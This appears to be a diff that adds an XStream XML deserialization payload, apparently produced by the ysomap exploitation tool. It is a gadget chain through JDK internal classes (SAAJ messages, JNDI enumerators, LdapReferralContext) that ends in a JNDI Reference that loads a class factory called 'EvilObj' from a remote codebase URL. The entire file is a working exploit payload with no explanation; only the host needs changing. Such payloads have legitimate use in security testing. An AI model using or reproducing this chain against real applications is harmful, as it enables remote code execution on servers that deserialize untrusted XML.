@@ -1,0 +1,74 @@
+<sorted-set>
+    <javax.naming.ldap.Rdn_-RdnEntry>
+        <type>ysomap</type>
+        <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
+            <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
+                <parsedMessage>true</parsedMessage>
+                <soapVersion>SOAP_11</soapVersion>
+                <bodyParts/>
+                <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
+                    <attachmentsInitialized>false</attachmentsInitialized>
+                    <multiPart class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart'>
+                        <soapPart/>
+                        <mm>
+                            <it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
+                                <aliases class='com.sun.jndi.toolkit.dir.ContextEnumerator'>
+                                    <children class='javax.naming.directory.BasicAttribute$ValuesEnumImpl'>
+                                        <list class='com.sun.xml.internal.dtdparser.SimpleHashtable'>
+                                            <current>
+                                                <hash>1</hash>
+                                                <key class='javax.naming.Binding'>
+                                                    <name>ysomap</name>
+                                                    <isRel>false</isRel>
+                                                    <boundObj class='com.sun.jndi.ldap.LdapReferralContext'>
+                                                        <refCtx class='javax.naming.spi.ContinuationDirContext'>
+                                                            <cpe>
+                                                                <stackTrace/>
+                                                                <suppressedExceptions class='java.util.Collections$UnmodifiableRandomAccessList' resolves-to='java.util.Collections$UnmodifiableList'>
+                                                                    <c class='list'/>
+                                                                    <list reference='../c'/>
+                                                                </suppressedExceptions>
+                                                                <resolvedObj class='javax.naming.Reference'>
+                                                                    <className>EvilObj</className>
+                                                                    <addrs/>
+                                                                    <classFactory>EvilObj</classFactory>
+                                                                    <classFactoryLocation>http://127.0.0.1:1099/</classFactoryLocation>
+                                                                </resolvedObj>
+                                                                <altName class='javax.naming.CompoundName' serialization='custom'>
+                                                                    <javax.naming.CompoundName>
+                                                                        <properties/>
+                                                                        <int>1</int>
+                                                                        <string>ysomap</string>
+                                                                    </javax.naming.CompoundName>
+                                                                </altName>
+                                                            </cpe>
+                                                        </refCtx>
+                                                        <skipThisReferral>false</skipThisReferral>
+                                                        <hopCount>0</hopCount>
+                                                    </boundObj>
+                                                </key>
+                                            </current>
+                                            <currentBucket>0</currentBucket>
+                                            <count>0</count>
+                                            <threshold>0</threshold>
+                                        </list>
+                                    </children>
+                                    <currentReturned>true</currentReturned>
+                                    <currentChildExpanded>false</currentChildExpanded>
+                                    <rootProcessed>true</rootProcessed>
+                                    <scope>2</scope>
+                                </aliases>
+                            </it>
+                        </mm>
+                    </multiPart>
+                </sm>
+            </message>
+        </value>
+    </javax.naming.ldap.Rdn_-RdnEntry>
+    <javax.naming.ldap.Rdn_-RdnEntry>
+        <type>ysomap</type>
+        <value class='com.sun.org.apache.xpath.internal.objects.XString'>
+            <m__obj class='string'>test</m__obj>
+        </value>
+    </javax.naming.ldap.Rdn_-RdnEntry>
+</sorted-set>
